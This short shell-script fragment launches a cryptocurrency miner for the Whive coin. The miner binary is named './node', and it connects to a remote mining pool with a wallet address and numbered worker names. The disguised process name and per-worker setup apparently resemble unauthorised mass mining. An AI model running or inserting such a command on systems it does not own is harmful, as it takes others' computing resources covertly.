...
./node --disable-gpu -a yespowerltncg -o us-east.coin-miners.info:7646 -u KCxkuCyNyB9CDMujccuvWxCz5PUDoyxpSv.net_${WORKER_NUMBER} -p id=net_${WORKER_NUMBER},c=CRNC,m=solo > try.log
# Whive
